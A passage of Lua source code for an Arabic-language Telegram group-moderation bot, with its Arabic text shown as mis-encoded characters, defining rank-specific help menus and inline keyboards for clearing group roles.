โ๏ธฐุงูุดุงุก ุฑุงุจุท
โ๏ธฐุถุน ูุตู
โ๏ธฐุถุน ุฑุงุจุท
โ๏ธฐุถุน ุตูุฑู
โ๏ธฐุญุฐู ุงูุฑุงุจุท
โ๏ธฐูุดู ุงูุจูุชุงุช
โ๏ธฐุทุฑุฏ ุงูุจูุชุงุช
โ๏ธฐุชูุธูู + ุงูุนุฏุฏ
โ๏ธฐุชูุธูู ุงูุชุนุฏูู
โ๏ธฐููููู + ุงููููู
โ๏ธฐุงุณู ุงูุจูุช + ุงูุงูุฑ
โ๏ธฐุถุน โข ุญุฐู โข ุชุฑุญูุจ
โ๏ธฐุถุน โข ุญุฐู โข ููุงููู
โ๏ธฐุงุถู โข ุญุฐู โข ุตูุงุญูู
โ๏ธฐุงูุตูุงุญูุงุช โข ุญุฐู ุงูุตูุงุญูุงุช
-----------------------------------------
โ๏ธฐุถุน ุณุจุงู + ุงูุนุฏุฏ
โ๏ธฐุถุน ุชูุฑุงุฑ + ุงูุนุฏุฏ
-----------------------------------------
โ๏ธฐุฑูุน ูููุฒ โข ุชูุฒูู ูููุฒ
โ๏ธฐุงููููุฒูู โข ุญุฐู ุงููููุฒูู
โ๏ธฐูุดู ุงููููุฏ โข ุฑูุน ุงููููุฏ
-----------------------------------------
โ๏ธฐุญุฐู โข ูุณุญ + ุจุงูุฑุฏ
โ๏ธฐููุน โข ุงูุบุงุก ููุน
โ๏ธฐูุงุฆูู ุงูููุน
โ๏ธฐุญุฐู ูุงุฆูู ุงูููุน
-----------------------------------------
โ๏ธฐุชูุนูู โข ุชุนุทูู โข ุงูุฑุงุจุท
โ๏ธฐุชูุนูู โข ุชุนุทูู โข ุงูุงูุนุงุจ
โ๏ธฐุชูุนูู โข ุชุนุทูู โข ุงูุชุฑุญูุจ
โ๏ธฐุชูุนูู โข ุชุนุทูู โข ุงูุชุงู ูููู
โ๏ธฐุชูุนูู โข ุชุนุทูู โข ูุดู ุงูุงุนุฏุงุฏุงุช
-----------------------------------------
โ๏ธฐุทุฑุฏ ุงููุญุฐูููู
โ๏ธฐุทุฑุฏ โข ุจุงูุฑุฏ โข ุจุงููุนุฑู โข ุจุงูุงูุฏู
โ๏ธฐูุชู โข ุงูุบุงุก ูุชู
โ๏ธฐุชููุฏ โข ุงูุบุงุก ุชููุฏ
โ๏ธฐุญุธุฑ โข ุงูุบุงุก ุญุธุฑ
โ๏ธฐุงูููุชูููู โข ุญุฐู ุงูููุชูููู
โ๏ธฐุงููููุฏูู โข ุญุฐู ุงููููุฏูู
โ๏ธฐุงููุญุธูุฑูู โข ุญุฐู ุงููุญุธูุฑูู
-----------------------------------------
โ๏ธฐุชูููุฏ ุฏูููู + ุนุฏุฏ ุงูุฏูุงุฆู
โ๏ธฐุชูููุฏ ุณุงุนู + ุนุฏุฏ ุงูุณุงุนุงุช
โ๏ธฐุชูููุฏ ููู + ุนุฏุฏ ุงูุงูุงู
โ๏ธฐุงูุบุงุก ุชูููุฏ โข ูุงูุบุงุก ุงูุชูููุฏ ุจุงูููุช
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]]
Dev_Rio(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "ุชุนููู ุงูุฑ ู3" and SecondSudo(msg) and ChCheck(msg) or text == "ุชุนููู ุงูุฑ ููฃ" and SecondSudo(msg) and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ูููุดุฉ (ู3) ุงูุงู " ,  1, "md")
DevRio:set(Rinda..'Rio:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local RindaTeam =  DevRio:get(Rinda..'Rio:Help31'..msg.sender_user_id_)
if RindaTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Rinda..'Rio:Help31'..msg.sender_user_id_)
DevRio:set(Rinda..'Rio:Help3', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู " ,  1, "md")
return false end
end
if text == "ู3" and ChCheck(msg) or text == "ููฃ" and ChCheck(msg) or text == "ุงูุงูุฑ3" and ChCheck(msg) or text == "ุงูุงูุฑูฃ" and ChCheck(msg) then
if not Admin(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุฐุง ุงูุงูุฑ ูุฎุต ุงูุฑุชุจ ุงูุงุนูู ููุท\nโ๏ธฐุงุฑุณู โข (ู6) ูุนุฑุถ ุงูุงูุฑ ุงูุงุนุถุงุก', 1, 'md')
else
local Help = DevRio:get(Rinda..'Rio:Help3')
local Text = [[
โ๏ธฐุงูุงูุฑ ุงููุฏุฑุงุก โข โค
-----------------------------------------
โ๏ธฐูุญุต ุงูุจูุช
โ๏ธฐุถุน ุงุณู + ุงูุงุณู
โ๏ธฐุงุถู โข ุญุฐู โข ุฑุฏ
โ๏ธฐุฑุฏูุฏ ุงููุฏูุฑ
โ๏ธฐุญุฐู ุฑุฏูุฏ ุงููุฏูุฑ
โ๏ธฐุงุถู โข ุญุฐู โข ุฑุฏ ูุชุนุฏุฏ
โ๏ธฐุญุฐู ุฑุฏ ูู ูุชุนุฏุฏ
โ๏ธฐุงูุฑุฏูุฏ ุงููุชุนุฏุฏู
โ๏ธฐุญุฐู ุงูุฑุฏูุฏ ุงููุชุนุฏุฏู
โ๏ธฐุญุฐู ููุงุฆู ุงูููุน
โ๏ธฐููุน โข ุจุงูุฑุฏ ุนูู ( ููุตู โข ุตูุฑู โข ูุชุญุฑูู )
โ๏ธฐุญุฐู ูุงุฆูู ููุน + โข โค
( ุงูุตูุฑ โข ุงููุชุญุฑูุงุช โข ุงูููุตูุงุช )
-----------------------------------------
โ๏ธฐุชูุฒูู ุงููู
โ๏ธฐุฑูุน ุงุฏูู โข ุชูุฒูู ุงุฏูู
โ๏ธฐุงูุงุฏูููู โข ุญุฐู ุงูุงุฏูููู
-----------------------------------------
โ๏ธฐุชุซุจูุช
โ๏ธฐุงูุบุงุก ุงูุชุซุจูุช
โ๏ธฐุงุนุงุฏู ุงูุชุซุจูุช
โ๏ธฐุงูุบุงุก ุชุซุจูุช ุงููู
-----------------------------------------
โ๏ธฐุชุบูุฑ ุฑุฏ + ุงุณู ุงูุฑุชุจู + ุงููุต โข โค
โ๏ธฐุงููุทูุฑ โข ููุดุฆ ุงูุงุณุงุณู
โ๏ธฐุงูููุดุฆ โข ุงููุฏูุฑ โข ุงูุงุฏูู
โ๏ธฐุงููููุฒ โข ุงูููุธู โข ุงูุนุถู
โ๏ธฐุญุฐู ุฑุฏูุฏ ุงูุฑุชุจ
-----------------------------------------
โ๏ธฐุชุบููุฑ ุงูุงูุฏู โข ูุชุบููุฑ ุงููููุดู
โ๏ธฐุชุนููู ุงูุงูุฏู โข ูุชุนููู ุงููููุดู
โ๏ธฐุญุฐู ุงูุงูุฏู โข ูุญุฐู ุงููููุดู
-----------------------------------------
โ๏ธฐุชูุนูู โข ุชุนุทูู + ุงูุงูุฑ โข โค
โ๏ธฐุงุทุฑุฏูู โข ุงูุงูุฏู ุจุงูุตูุฑู โข ุงูุงุจุฑุงุฌ
โ๏ธฐูุนุงูู ุงูุงุณูุงุก โข ุงูุงูุฑ ุงููุณุจ โข ุงูุทู
โ๏ธฐุงูุงูุฏู โข ุชุญููู ุงูุตูุบ โข ุงูุงูุฑ ุงูุชุญุดูุด
โ๏ธฐุฑุฏูุฏ ุงููุฏูุฑ โข ุฑุฏูุฏ ุงููุทูุฑ โข ุงูุชุญูู
โ๏ธฐุถุงููู โข ุญุณุงุจ ุงูุนูุฑ โข ุงูุฒุฎุฑูู
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]]
Dev_Rio(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "ุชุนููู ุงูุฑ ู4" and ChCheck(msg) and SecondSudo(msg) or text == "ุชุนููู ุงูุฑ ููค" and SecondSudo(msg) and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ูููุดุฉ (ู4) ุงูุงู " ,  1, "md")
DevRio:set(Rinda..'Rio:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local RindaTeam =  DevRio:get(Rinda..'Rio:Help41'..msg.sender_user_id_)
if RindaTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Rinda..'Rio:Help41'..msg.sender_user_id_)
DevRio:set(Rinda..'Rio:Help4', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู" ,  1, "md")
return false end
end
if text == "ููค" and ChCheck(msg) or text == "ู4" and ChCheck(msg) or text == "ุงูุงูุฑ4" and ChCheck(msg) or text == "ุงูุงูุฑูค" and ChCheck(msg) then
if not Admin(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุฐุง ุงูุงูุฑ ูุฎุต ุงูุฑุชุจ ุงูุงุนูู ููุท\nโ๏ธฐุงุฑุณู โข (ู6) ูุนุฑุถ ุงูุงูุฑ ุงูุงุนุถุงุก', 1, 'md')
else
local Help = DevRio:get(Rinda..'Rio:Help4')
local Text = [[
โ๏ธฐุงูุงูุฑ ุงูููุดุฆูู โข โค
-----------------------------------------
โ๏ธฐุชูุฒูู ุงููู
โ๏ธฐุงูููุฏูุง โข ุงูุณุญ
โ๏ธฐุชุนูู ุนุฏุฏ ุงูุญุฐู
โ๏ธฐุชุฑุชูุจ ุงูุงูุงูุฑ
โ๏ธฐุงุถู โข ุญุฐู โข ุงูุฑ
โ๏ธฐุญุฐู ุงูุงูุงูุฑ ุงููุถุงูู
โ๏ธฐุงูุงูุงูุฑ ุงููุถุงูู
โ๏ธฐุงุถู ููุงุท โข ุจุงูุฑุฏ โข ุจุงูุงูุฏู
โ๏ธฐุงุถู ุฑุณุงุฆู โข ุจุงูุฑุฏ โข ุจุงูุงูุฏู
โ๏ธฐุฑูุน ููุธู โข ุชูุฒูู ููุธู
โ๏ธฐุงูููุธููู โข ุญุฐู ุงูููุธููู
โ๏ธฐุฑูุน ูุฏูุฑ โข ุชูุฒูู ูุฏูุฑ
โ๏ธฐุงููุฏุฑุงุก โข ุญุฐู ุงููุฏุฑุงุก
โ๏ธฐุชูุนูู โข ุชุนุทูู + ุงูุงูุฑ โข โค
โ๏ธฐูุฒููู โข ุงูุณุญ
โ๏ธฐุงูุญุธุฑ โข ุงููุชู
-----------------------------------------
โ๏ธฐุงูุงูุฑ ุงูููุดุฆูู ุงูุงุณุงุณููู โข โค
-----------------------------------------
โ๏ธฐูุถุน ููุจ + ุงูููุจ
โ๏ธฐุชูุนูู โข ุชุนุทูู โข ุงูุฑูุน
โ๏ธฐุฑูุน ููุดุฆ โข ุชูุฒูู ููุดุฆ
โ๏ธฐุงูููุดุฆูู โข ุญุฐู ุงูููุดุฆูู
โ๏ธฐุฑูุน โข ุชูุฒูู โข ูุดุฑู
โ๏ธฐุฑูุน ุจูู ุงูุตูุงุญูุงุช
โ๏ธฐุญุฐู ุงูููุงุฆู
-----------------------------------------
โ๏ธฐุงูุงูุฑ ุงููุงูููู โข โค
-----------------------------------------
โ๏ธฐุฑูุน โข ุชูุฒูู โข ููุดุฆ ุงุณุงุณู
โ๏ธฐุญุฐู ุงูููุดุฆูู ุงูุงุณุงุณููู 
โ๏ธฐุงูููุดุฆูู ุงูุงุณุงุณููู 
โ๏ธฐุญุฐู ุฌููุน ุงูุฑุชุจ
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]]
Dev_Rio(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "ุชุนููู ุงูุฑ ู5" and SecondSudo(msg) and ChCheck(msg) or text == "ุชุนููู ุงูุฑ ููฅ" and SecondSudo(msg) and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ูููุดุฉ (ู5) ุงูุงู " ,  1, "md")
DevRio:set(Rinda..'Rio:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local RindaTeam =  DevRio:get(Rinda..'Rio:Help51'..msg.sender_user_id_)
if RindaTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Rinda..'Rio:Help51'..msg.sender_user_id_)
DevRio:set(Rinda..'Rio:Help5', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู " ,  1, "md")
return false end
end
if text == "ููฅ" and ChCheck(msg) or text == "ู5" and ChCheck(msg) or text == "ุงูุงูุฑ5" and ChCheck(msg) or text == "ุงูุงูุฑูฅ" and ChCheck(msg) then
if not SudoBot(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุฐุง ุงูุงูุฑ ูููุทูุฑูู ููุท', 1, 'md')
else
local Help = DevRio:get(Rinda..'Rio:Help5')
local Text = [[
โ๏ธฐุงูุงูุฑ ุงููุทูุฑูู โข โค
-----------------------------------------
โ๏ธฐุงููุฑูุจุงุช
โ๏ธฐุงููุทูุฑูู
โ๏ธฐุงููุดุชุฑููู
โ๏ธฐุงูุงุญุตุงุฆูุงุช
โ๏ธฐุงููุฌููุนุงุช
โ๏ธฐุงุณู ุงูุจูุช + ุบุงุฏุฑ
โ๏ธฐุงุณู ุงูุจูุช + ุชุนุทูู
โ๏ธฐูุดู + -ุงูุฏู ุงููุฌููุนู
โ๏ธฐุฑูุน ูุงูู โข ุชูุฒูู ูุงูู
โ๏ธฐุงููุงูููู โข ุญุฐู ุงููุงูููู
-----------------------------------------
โ๏ธฐุฑูุน โข ุชูุฒูู โข ูุฏูุฑ ุนุงู
โ๏ธฐุญุฐู โข ุงููุฏุฑุงุก ุงูุนุงููู 
โ๏ธฐุฑูุน โข ุชูุฒูู โข ุงุฏูู ุนุงู
โ๏ธฐุญุฐู โข ุงูุงุฏูููู ุงูุนุงููู 
โ๏ธฐุฑูุน โข ุชูุฒูู โข ูููุฒ ุนุงู
โ๏ธฐุญุฐู โข ุงููููุฒูู ุนุงู 
-----------------------------------------
โ๏ธฐุงูุงูุฑ ุงููุทูุฑ ุงูุงุณุงุณู โข โค
-----------------------------------------
โ๏ธฐุชุญุฏูุซ
โ๏ธฐุงูุณูุฑูุฑ
โ๏ธฐุฑูุงุจุท ุงููุฑูุจุงุช
โ๏ธฐุชุญุฏูุซ ุฑููุฏุง
โ๏ธฐุชูุธูู ุงููุฑูุจุงุช
โ๏ธฐุชูุธูู ุงููุดุชุฑููู
โ๏ธฐุญุฐู ุฌููุน ุงููููุงุช
โ๏ธฐุชุนููู ุงูุงูุฏู ุงูุนุงู
โ๏ธฐุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู
โ๏ธฐุญุฐู ูุนูููุงุช ุงูุชุฑุญูุจ
โ๏ธฐุชุบูุฑ ูุนูููุงุช ุงูุชุฑุญูุจ
โ๏ธฐุบุงุฏุฑ + -ุงูุฏู ุงููุฌููุนู
โ๏ธฐุชุนููู ุนุฏุฏ ุงูุงุนุถุงุก + ุงูุนุฏุฏ
โ๏ธฐุญุธุฑ ุนุงู โข ุงูุบุงุก ุงูุนุงู
โ๏ธฐูุชู ุนุงู โข ุงูุบุงุก ุงูุนุงู
โ๏ธฐูุงุฆูู ุงูุนุงู โข ุญุฐู ูุงุฆูู ุงูุนุงู
โ๏ธฐูุถุน โข ุญุฐู โข ุงุณู ุงูุจูุช
โ๏ธฐุงุถู โข ุญุฐู โข ุฑุฏ ุนุงู
โ๏ธฐุฑุฏูุฏ ุงููุทูุฑ โข ุญุฐู ุฑุฏูุฏ ุงููุทูุฑ
โ๏ธฐุชุนููู โข ุญุฐู โข ุฌูุจ โข ุฑุฏ ุงูุฎุงุต
โ๏ธฐุฌูุจ ูุณุฎู ุงููุฑูุจุงุช
โ๏ธฐุฑูุน ุงููุณุฎู + ุจุงูุฑุฏ ุนูู ุงูููู
โ๏ธฐุชุนููู โข ุญุฐู โข ููุงุฉ ุงูุงุดุชุฑุงู
โ๏ธฐุฌูุจ ูููุดู ุงูุงุดุชุฑุงู
โ๏ธฐุชุบููุฑ โข ุญุฐู โข ูููุดู ุงูุงุดุชุฑุงู
โ๏ธฐุฑูุน โข ุชูุฒูู โข ูุทูุฑ
โ๏ธฐุงููุทูุฑูู โข ุญุฐู ุงููุทูุฑูู
โ๏ธฐุฑูุน โข ุชูุฒูู โข ูุทูุฑ ุซุงููู
โ๏ธฐุงูุซุงููููู โข ุญุฐู ุงูุซุงููููู
โ๏ธฐุชุนููู โข ุญุฐู โข ูููุดุฉ ุงูุงูุฏู
โ๏ธฐุงุฐุงุนู ูููู ุจุงูุชูุฌูู โข ุจุงูุฑุฏ
-----------------------------------------
โ๏ธฐุชูุนูู ููู + ุงุณู ุงูููู
โ๏ธฐุชุนุทูู ููู + ุงุณู ุงูููู
โ๏ธฐุชูุนูู โข ุชุนุทูู + ุงูุงูุฑ โข โค
โ๏ธฐุงูุงุฐุงุนู โข ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู
โ๏ธฐุชุฑุญูุจ ุงูุจูุช โข ุงููุบุงุฏุฑู
โ๏ธฐุงูุจูุช ุงูุฎุฏูู โข ุงูุชูุงุตู
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]]
Dev_Rio(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "ุชุนููู ุงูุฑ ู6" and SecondSudo(msg) and ChCheck(msg) or text == "ุชุนููู ุงูุฑ ููฆ" and SecondSudo(msg) and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ูููุดุฉ (ู6) ุงูุงู " ,  1, "md")
DevRio:set(Rinda..'Rio:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local RindaTeam =  DevRio:get(Rinda..'Rio:Help61'..msg.sender_user_id_)
if RindaTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Rinda..'Rio:Help61'..msg.sender_user_id_)
DevRio:set(Rinda..'Rio:Help6', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู" ,  1, "md")
return false end
end
if text == "ููฆ" and ChCheck(msg) or text == "ู6" and ChCheck(msg) or text == "ุงูุงูุฑ6" and ChCheck(msg) or text == "ุงูุงูุฑูฆ" and ChCheck(msg) then
local Help = DevRio:get(Rinda..'Rio:Help6')
local Text = [[
โ๏ธฐุงูุงูุฑ ุงูุงุนุถุงุก โข โค
-----------------------------------------
โ๏ธฐุงูุณูุฑุณ โข ูููุนู โข ุฑุชุจุชู โข ูุนูููุงุชู 
โ๏ธฐุฑููู โข ููุจู โข ูุจุฐุชู โข ุตูุงุญูุงุชู โข ุบูููู
โ๏ธฐุฑุณุงุฆูู โข ุญุฐู ุฑุณุงุฆูู โข ุงุณูู โข ูุนุฑูู 
โ๏ธฐุงูุฏู โขุงูุฏูู โข ุฌูุงุชู โข ุฑุงุณููู โข ุงูุงูุนุงุจ 
โ๏ธฐููุงุทู โข ุจูุน ููุงุทู โข ุงูููุงููู โข ุฒุฎุฑูู 
โ๏ธฐุฑุงุจุท ุงูุญุฐู โข ูุฒููู โข ุงุทุฑุฏูู โข ุงููุทูุฑ 
โ๏ธฐููู ุถุงููู โข ูุดุงูุฏุงุช ุงูููุดูุฑ โข ุงูุฑุงุจุท 
โ๏ธฐุงูุฏู ุงููุฌููุนู โข ูุนูููุงุช ุงููุฌููุนู 
โ๏ธฐูุณุจู ุงูุญุจ โข ูุณุจู ุงููุฑู โข ูุณุจู ุงูุบุจุงุก 
โ๏ธฐูุณุจู ุงูุฑุฌููู โข ูุณุจู ุงูุงููุซู โข ุงูุชูุงุนู
-----------------------------------------
โ๏ธฐููุจู + ุจุงูุฑุฏ
โ๏ธฐููู + ุงููููู
โ๏ธฐุฒุฎุฑูู + ุงุณูู
โ๏ธฐุจุฑุฌ + ููุน ุงูุจุฑุฌ
โ๏ธฐูุนูู ุงุณู + ุงูุงุณู
โ๏ธฐุจูุณู โข ุจูุณูุง โข ุจุงูุฑุฏ
โ๏ธฐุงุญุณุจ + ุชุงุฑูุฎ ูููุงุฏู
โ๏ธฐุชูุงุนูู โข ุชูุงุนูู โข ุจุงูุฑุฏ
โ๏ธฐุตูุงุญูุงุชู โข ุจุงูุฑุฏ โข ุจุงููุนุฑู โข ุจุงูุงูุฏู
โ๏ธฐุงูุฏู โข ูุดู  โข ุจุงูุฑุฏ โข ุจุงููุนุฑู โข ุจุงูุงูุฏู
โ๏ธฐุชุญููู + ุจุงูุฑุฏ โข ุตูุฑู โข ููุตู โข ุตูุช โข ุจุตูู
โ๏ธฐุงูุทู + ุงูููุงู ุชุฏุนู ุฌููุน ุงููุบุงุช ูุน ุงูุชุฑุฌูู ููุนุฑุจู
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]]
Dev_Rio(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ูุณุญ ุงูุฑุชุจ" and Admin(msg) then
local Del = DevRio:get(Rinda..'Rio:Del')
local Text = [[
โ๏ธฐุงููุง ุจู ูู ูุงุฆูุฉ ุงูุงูุฑ ุงูุฑุชุจ โขโฏ
-----------------------------------------
*โ๏ธฐููููู ูุณุญ ุฑุชุจ ุงููุฌููุนู ูู ุฎูุงู ุงูุงุฒุฑุงุฑ ุงุณูู*
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]] 
keyboard = {} 
if Sudo(msg) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูุงุณุงุณููู โข",callback_data="/DelRioSudo:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูุซุงููููู โข",callback_data="/DelSecondSudo:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููุทูุฑูู โข",callback_data="/DelSudoBot:"..msg.sender_user_id_},{text="โข ูุณุญ ุงููุงูููู โข",callback_data="/DelOwner:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงูููุดุฆูู ุงูุงุณุงุณููู โข",callback_data="/DelBasicConstructor:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูููุดุฆูู โข",callback_data="/DelConstructor:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif RioSudo(msg) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูุซุงููููู โข",callback_data="/DelSecondSudo:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููุทูุฑูู โข",callback_data="/DelSudoBot:"..msg.sender_user_id_},{text="โข ูุณุญ ุงููุงูููู โข",callback_data="/DelOwner:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงูููุดุฆูู ุงูุงุณุงุณููู โข",callback_data="/DelBasicConstructor:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูููุดุฆูู โข",callback_data="/DelConstructor:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif SecondSudo(msg) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููุทูุฑูู โข",callback_data="/DelSudoBot:"..msg.sender_user_id_},{text="โข ูุณุญ ุงููุงูููู โข",callback_data="/DelOwner:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงูููุดุฆูู ุงูุงุณุงุณููู โข",callback_data="/DelBasicConstructor:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูููุดุฆูู โข",callback_data="/DelConstructor:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif SudoBot(msg) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููุงูููู โข",callback_data="/DelOwner:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงูููุดุฆูู ุงูุงุณุงุณููู โข",callback_data="/DelBasicConstructor:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูููุดุฆูู โข",callback_data="/DelConstructor:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Owner(msg) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูููุดุฆูู ุงูุงุณุงุณููู โข",callback_data="/DelBasicConstructor:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูููุดุฆูู โข",callback_data="/DelConstructor:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif BasicConstructor(msg) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูููุดุฆูู โข",callback_data="/DelConstructor:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Constructor(msg) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Manager(msg) then
